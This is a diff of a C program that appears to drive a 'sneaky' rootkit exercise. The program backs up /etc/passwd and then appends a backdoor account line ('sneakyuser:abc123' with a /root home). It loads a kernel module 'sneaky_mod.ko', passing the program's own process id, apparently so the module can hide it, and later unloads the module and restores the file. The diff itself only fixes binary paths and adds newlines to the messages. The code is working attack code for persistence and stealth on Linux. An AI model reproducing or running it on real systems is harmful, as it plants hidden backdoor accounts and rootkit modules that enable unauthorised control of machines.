@@ -9,7 +9,7 @@ int main() {
 
     // Copy password file
     if(fork() == 0) {
-        execl("/bin/cp", "/bin/cp", "/etc/passwd", "/tmp/passwd", (char*)NULL);
+        execl("/usr/bin/cp", "/usr/bin/cp", "/etc/passwd", "/tmp/passwd", (char*)NULL);
     }
     wait(NULL);
     printf("Copied password file\n");
@@ -17,16 +17,16 @@ int main() {
     // Append line
     FILE * passwordFile = fopen("/etc/passwd", "a");
     fprintf(passwordFile, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
-    printf("Appened line to password file");
+    printf("Appened line to password file\n");
 
     // Load module
     char arg[20];
     sprintf(arg, "pid=%d", getpid());
     if(fork() == 0) {
-        execl("/bin/insmod", "/bin/insmod", "sneaky_mod.ko", arg, (char*)NULL);
+        execl("/usr/sbin/insmod", "/usr/sbin/insmod", "sneaky_mod.ko", arg, (char*)NULL);
     }
     wait(NULL);
-    printf("Loaded module");
+    printf("Loaded module\n");
 
     // Enter loop
     static struct termios oldt, newt;
@@ -39,17 +39,17 @@ int main() {
 
     // Unload module
     if(fork() == 0) {
-        execl("/bin/rmmod", "/bin/rmmod", "sneaky_mod", (char*)NULL);
+        execl("/usr/sbin/rmmod", "/usr/sbin/rmmod", "sneaky_mod", (char*)NULL);
     }
     wait(NULL);
-    printf("Unloaded module");
+    printf("Unloaded module\n");
 
     // Restore password file
     if(fork() == 0) {
-        execl("/bin/cp", "/bin/cp", "/tmp/passwd", "/etc/passwd", (char*)NULL);
+        execl("/usr/bin/cp", "/usr/bin/cp", "/tmp/passwd", "/etc/passwd", (char*)NULL);
     }
     wait(NULL);
-    printf("Restored password file");
+    printf("Restored password file\n");
 
 
     return EXIT_SUCCESS;
